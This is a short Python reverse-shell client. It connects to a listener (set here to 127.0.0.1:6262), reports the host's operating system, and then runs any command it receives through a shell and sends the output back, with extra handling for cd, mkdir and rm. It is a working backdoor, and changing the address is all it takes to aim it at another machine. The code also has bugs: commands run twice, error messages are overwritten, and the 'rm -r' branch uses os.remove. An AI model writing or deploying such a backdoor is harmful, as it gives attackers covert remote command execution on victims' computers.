from socket import *
import os, platform, subprocess

ip = "127.0.0.1"
port = 6262
platf = platform.system().encode()

s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))
s.send(platf)

while True:
    comm = s.recv(1024).decode()
    comm_execute = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sdc = f"command: {comm} not found"
    if comm.startswith("cd "):
        comm = comm.replace("cd ", "")
        os.chdir(comm)
        sdc = comm
    elif comm.startswith("mkdir "):
    
        comm = comm.replace("mkdir ", "")
        
        try:
            os.mkdir(comm)
        except:
            sdc = f"mkdir: cannot create directory ‘{comm}’: File exists"

        sdc = f"mkdir: directory '{comm}' create"
    elif comm.startswith("rm -r "):
    
        comm = comm.replace("rm -r ", "")

        try:
            os.remove(comm)
        except OSError as er:
            sdc = f"rm: {er}"

        sdc = f"rm: remove directory {comm}"
    elif comm.startswith("rm "):
        sdc = "need 1 argument '-r'"
    else:
        try:
            sdc = comm_execute.stdout.read().decode()
        except:
            sdc = ""
        
    s.send(sdc.encode())
    print(sdc)
